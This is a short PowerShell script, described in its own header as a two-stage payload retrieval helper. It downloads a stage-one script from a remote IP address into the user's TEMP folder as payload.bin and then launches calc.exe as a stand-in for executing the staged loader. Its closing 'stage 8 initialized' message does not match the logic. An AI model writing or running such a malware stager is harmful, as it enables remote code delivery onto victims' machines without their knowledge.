
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
$TargetUrl = "http://192.0.2.25/stage1.ps1"
$PayloadPath = "$env:TEMP\payload.bin"
$ConnectionTimeout = 67
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $OperationResult = Invoke-StageDownload -SourceUrl $TargetUrl -DestinationPath $PayloadPath -TimeoutSec $ConnectionTimeout
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Output "stage 8 initialized"
